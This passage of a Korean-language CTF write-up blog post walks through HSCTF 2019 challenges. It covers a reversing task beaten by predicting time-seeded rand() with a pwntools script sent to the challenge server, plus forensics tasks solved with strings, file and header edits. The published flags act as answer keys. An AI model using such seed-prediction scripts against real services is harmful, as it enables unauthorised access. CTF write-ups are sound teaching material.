+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+{
+
+[snip]
+
+  <span style="color:#66d9ef">int</span> v18[<span style="color:#ae81ff">6</span>]; <span style="color:#75715e">// [sp+30h] [bp-260h]@1
+</span><span style="color:#75715e"></span>
+[snip]
+
+  std<span style="color:#f92672">::</span>basic_ifstream<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;::</span>basic_ifstream(<span style="color:#f92672">&amp;</span>v20, <span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#ae81ff">8LL</span>);
+  v3 <span style="color:#f92672">=</span> time(<span style="color:#ae81ff">0LL</span>);
+  srand(v3);
+  LODWORD(v4) <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>operator<span style="color:#f92672">&lt;&lt;&lt;</span>std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span>std<span style="color:#f92672">::</span>cout, <span style="color:#e6db74">&#34;Welcome to Tux Talk Show 2019!!!&#34;</span>);
+  std<span style="color:#f92672">::</span>operator<span style="color:#f92672">&lt;&lt;</span>(v4, <span style="color:#f92672">&amp;</span>std<span style="color:#f92672">::</span>endl<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
+  std<span style="color:#f92672">::</span>operator<span style="color:#f92672">&lt;&lt;&lt;</span>std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span>std<span style="color:#f92672">::</span>cout, <span style="color:#e6db74">&#34;Enter your lucky number: &#34;</span>);
+  std<span style="color:#f92672">::</span>operator<span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span>std<span style="color:#f92672">::</span>cin, <span style="color:#f92672">&amp;</span>v8);
+  
+[snip]
+
+  v18[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">121</span>;
+  v18[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1231231</span>;
+  v18[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">20312312</span>;
+  v18[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">122342342</span>;
+  v18[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">90988878</span>;
+  v18[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">30</span>;
+  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">5</span>; <span style="color:#f92672">++</span>i )
+    v18[i] <span style="color:#f92672">-=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+  v10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  <span style="color:#66d9ef">for</span> ( j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">5</span>; <span style="color:#f92672">++</span>j )
+    v10 <span style="color:#f92672">+=</span> v18[j];
+  <span style="color:#66d9ef">if</span> ( v10 <span style="color:#f92672">==</span> v8 )
+  {
+    <span style="color:#75715e">// Congratz!! flag is hsctf{n1ce_j0b_w4th_r4ndom_gue33ing}
+</span><span style="color:#75715e"></span>  }
+
+[snip]</code></pre></td></tr></table>
+</div>
+</div></p>
+
+<p>입력한 숫자 v8이 연산 값 v10과 같아야지 flag.txt를 얻을 수 있다.
+연산 값 v10은 다음과 같이 생성된다.</p>
+
+<ol>
+<li>현재 시간을 seed로 받아 rand() 값을 준비한다. (line 11-12)</li>
+<li>v18 테이블을 초기 세팅한다. (line 20-25)</li>
+<li>rand() 값으로 v18 테이블을 변형시킨다. (line 26-27)</li>
+<li>v18 테이블을 전부 합한 값이 v10 이다. (line 29-30)</li>
+</ol>
+
+<p>파이썬에서 ctypes 모듈을 사용했다.</p>
+
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> ctypes
+<span style="color:#f92672">import</span> time
+
+t <span style="color:#f92672">=</span> int(time<span style="color:#f92672">.</span>time())
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;rev.hsctf.com&#39;</span>, <span style="color:#ae81ff">6767</span>)
+c <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>CDLL(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
+c<span style="color:#f92672">.</span>srand(t)
+v18 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">1231231</span>, <span style="color:#ae81ff">20312312</span>, <span style="color:#ae81ff">122342342</span>, <span style="color:#ae81ff">90988878</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">30</span>]
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(v18)):
+    v18[i] <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_int(v18[i] <span style="color:#f92672">-</span> c<span style="color:#f92672">.</span>rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>value
+
+r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(ctypes<span style="color:#f92672">.</span>c_int(sum(v18))<span style="color:#f92672">.</span>value))
+
+r<span style="color:#f92672">.</span>interactive()</code></pre></td></tr></table>
+</div>
+</div>
+
+<p>로컬과 문제 서버의 시간차가 있을 수 있으므로 여러 번 시도하면 된다.</p>
+
+<p>flag : <code>hsctf{n1ce_j0b_w4th_r4ndom_gue33ing}</code></p>
+
+<h1 id="forensics-index"><a href="#index">Forensics</a></h1>
+
+<h2 id="chicken-crossing-index"><a href="#index">Chicken Crossing</a></h2>
+
+<pre><code class="language-diff">Chicken Crossing
+56
+Written by: Jeremy Hui
+
+Keith is watching chickens cross a road in his grandfather’s farm. He once heard from his grandfather that there was something significant about this behavior, but he can’t figure out why. Help Keith discover what the chickens are doing from this seemingly simple behavior.
+
+e5ab45d033b4075f365883362a616ac9  hsctf-chicken_crossing.jpg
+</code></pre>
+
+<p>jpg 파일을 제공해주는데 strings를 이용해서 문자열을 확인해보면 flag가 나온다.</p>
+
+<pre><code class="language-shell"># strings hsctf-chicken_crossing.jpg | grep hs
+hsctf{2_get_2_the_other_side}
+</code></pre>
+
+<h2 id="cool-image-index"><a href="#index">Cool Image</a></h2>
+
+<pre><code class="language-diff">Cool Image
+102
+Forensics cppio
+Written by: cppio
+
+My friend told me he found a really cool image, but I couldn't open it. Can you help me access the image?
+
+bda351d76be020420afa099dcea54b84  cool.pdf
+</code></pre>
+
+<p>친구가 내게 정말 멋진 이미지를 찾았다고 했는데 열리지가 않는다. 이 이미지에 접근할 수 있게 도와줄 수 있겠니?</p>
+
+<p>문제 지문을 읽었다면 이상한 낌새를 눈치채야 한다.
+지문에서 <code>이미지</code>라고 했는데 <code>cool.pdf</code> pdf 파일을 줬다.
+물론 pdf에도 이미지가 있을 순 있긴 하다.</p>
+
+<pre><code class="language-shell"># file cool.pdf
+cool.pdf: PNG image data, 1326 x 89, 8-bit/color RGBA, non-interlaced
+</code></pre>
+
+<p>file 명령어로 알아보니 PNG 파일이었다.
+cool.png로 변경 후 열어보면 flag가 있다.</p>
+
+<p>flag : <code>hsctf{who_uses_extensions_anyways}</code></p>
+
+<h2 id="cool-image-2-index"><a href="#index">Cool Image 2</a></h2>
+
+<p>이번에는 cool.png 를 준다.
+strings 로 푸는것도 아닌거같고 footer도 정상이다.
+그렇다면 header를 확인해보니</p>
+
+<pre><code>I found this cool file. Its really cool!
+&lt;89&gt;PNG^M
+^Z
+^@^@^@^MIHDR^@^@^D¶^@^@^@Y^H^F^@^@^@#;­Ñ^@^@^@^DgAMA^@^@±&lt;8f&gt;^Küa^E^@^@^@^FbKGD^@ÿ^@ÿ^@ÿ ½§&lt;93&gt;^@^@^@   pHYs^@^@^K^S^@^@^K^S^A^@&lt;9a&gt;&lt;9c&gt;^X^@^@^@^GtIME^Gã^E^_^O^K^V&lt;80&gt;â &lt;92&gt;^@^@ ^@IDATxÚì]ex^TW^W~ïÌ
+</code></pre>
+
+<p>맨 위의 I found this cool file. Its really cool! 을 지우고 파일을 열면 flag가 보인다.</p>
+
+<p>flag : <code>hsctf{sorry_about_the_extra_bytes}</code></p>
+
+<h2 id="slap-index"><a href="#index">Slap</a></h2>
+
+<p>strings 로 풀었다.</p>
+
+<pre><code class="language-shell"># strings slap.jpg | egrep -o hsctf{.*}
+hsctf{twoslapsnonetforce}
+hsctf{twoslapsnonetforce}
+</code></pre>
+
+<p>flag : <code>hsctf{twoslapsnonetforce}</code></p>
+
+    </div>
+
+    
+
+<div class="article-tags">
+  
+  <a class="badge badge-light" href="/tags/hsctf/">HSCTF</a>
+  
+  <a class="badge badge-light" href="/tags/ctf/">CTF</a>
+  
+  <a class="badge badge-light" href="/tags/2019/">2019</a>
+  
+  <a class="badge badge-light" href="/tags/rsa/">RSA</a>
+  
+  <a class="badge badge-light" href="/tags/git/">Git</a>
+  
+  <a class="badge badge-light" href="/tags/sql/">SQL</a>
+  
+  <a class="badge badge-light" href="/tags/brute-force/">Brute Force</a>
+  
+  <a class="badge badge-light" href="/tags/rand/">rand</a>
+  
+  <a class="badge badge-light" href="/tags/strings/">strings</a>
+  
+  <a class="badge badge-light" href="/tags/signature/">signature</a>
+  
+</div>
+
+
+
+    
+      
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+    
+  
+  
+  <div class="media author-card" itemscope itemtype="http://schema.org/Person">
+    
+      
+      <img class="portrait mr-3" src="/authors/admin/avatar_hu52a603635ecebd45650b162dadabb4e5_12861_250x250_fill_q90_lanczos_center.jpg" itemprop="image" alt="Avatar">
+    
+
+    <div class="media-body">
+      <h5 class="card-title" itemprop="name"><a href="https://j3rrry.netlify.com/">j3rrry</a></h5>
+      <h6 class="card-subtitle">K-Shield Jr. 분석대응 2기</h6>
+      <p class="card-text" itemprop="description">4년제 졸업했으며 현재 취업연계 교육을 받고 있으며 CTF 참가하는 것을 좋아합니다. 취업시켜주세요!</p>
+      <ul class="network-icon" aria-hidden="true">
+        
+          
+          
+          
+            
+          
+          
+          
+          
+          
+            
+          
+          <li>
+            <a itemprop="sameAs" href="/#contact" >
+              <i class="fas fa-envelope"></i>
+            </a>
+          </li>
+        
+          
+          
+          
+            
+          
+          
+          
+          
+          
+            
+          
+          <li>
+            <a itemprop="sameAs" href="https://twitter.com/leunja" target="_blank" rel="noopener">
+              <i class="fab fa-twitter"></i>
+            </a>
+          </li>
+        
+          
+          
+          
+            
+          
+          
+          
+          
+          
+            
+          
+          <li>
+            <a itemprop="sameAs" href="https://fb.com/n3cin1" target="_blank" rel="noopener">
+              <i class="fab fa-facebook"></i>
+            </a>
+          </li>
+        
+          
+          
+          
+            
+          
+          
+          
+          
+          
+            
+          
+          <li>
+            <a itemprop="sameAs" href="https://github.com/j3rrry" target="_blank" rel="noopener">
+              <i class="fab fa-github"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+
+      
+      
+      <div class="article-widget">
+        <div class="hr-light"></div>
+        <h3>Related</h3>
+        <ul>
+          
+          <li><a href="/post/facebook-ctf-2019-pwnable-overfloat-writeup/">Facebook CTF 2019 Pwnable Overfloat Writeup</a></li>
+          
+          <li><a href="/post/easy-rev/">Easy Rev</a></li>
+          
+          <li><a href="/post/trust-ctf-2019/">TRUST CTF 2019</a></li>
+          
+        </ul>
+      </div>
+      
+    
+
+    
+
+    
+<section id="comments">
+  <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "j3rrry" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+
+
+
+  </div>
+</article>
+
+      
+
+    
+    
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" integrity="sha256-X5PoE3KU5l+JcX+w09p/wHl9AzK333C4hJ2I9S5mD4M=" crossorigin="anonymous"></script>
+
+      
+
+      
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/highlight.min.js" integrity="sha256-aYTdUrn6Ow1DDgh5JTc3aDGnnju48y/1c8s1dgkYPQ8=" crossorigin="anonymous"></script>
+        
+      
+
+      
+      
+    
+
+    
+    
+
+    
+    
+    
+    <script id="dsq-count-scr" src="//j3rrry.disqus.com/count.js" async></script>
+    
+
+    
+    
+    <script>hljs.initHighlightingOnLoad();</script>
+    
+
+    
+    
+    <script>
+      const search_index_filename = "/index.json";
+      const i18n = {
+        'placeholder': "Search...",
+        'results': "results found",
+        'no_results': "No results found"
+      };
+      const content_type = {
+        'post': "Posts",
+        'project': "Projects",
+        'publication' : "Publications",
+        'talk' : "Talks"
+        };
+    </script>
+    
+
+    
+    
+
+    
+    
+    <script id="search-hit-fuse-template" type="text/x-template">
+      <div class="search-hit" id="summary-{{key}}">
+      <div class="search-hit-content">
+        <div class="search-hit-name">
+          <a href="{{relpermalink}}">{{title}}</a>
+          <div class="article-metadata search-hit-type">{{type}}</div>
+          <p class="search-hit-description">{{snippet}}</p>
+        </div>
+      </div>
+      </div>
+    </script>
+    
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js" integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js" integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin="anonymous"></script>
+    
+
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      
+    
+    
+    
+    
+    <script src="/js/academic.min.9ef1b53ee2bde6c7f33b150c6ba4d452.js"></script>
+
+    
+
+
+
+
+
+
+  
+  <div class="container">
+    <footer class="site-footer">
+  
+
+  <p class="powered-by">
+    &copy; 2019 j3rrry &middot; 
+
+    Powered by the
+    <a href="https://sourcethemes.com/academic/" target="_blank" rel="noopener">Academic theme</a> for
+    <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a>.
+
+    
+    <span class="float-right" aria-hidden="true">
+      <a href="#" id="back_to_top">
+        <span class="button_icon">
+          <i class="fas fa-chevron-up fa-2x"></i>
+        </span>
+      </a>
+    </span>
+    
+  </p>
+</footer>
+
+  </div>
+  
+
+  
+<div id="modal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">Cite</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <pre><code class="tex hljs"></code></pre>
+      </div>
+      <div class="modal-footer">
+        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
+          <i class="fas fa-copy"></i> Copy
+        </a>
+        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
+          <i class="fas fa-download"></i> Download
+        </a>
+        <div id="modal-error"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
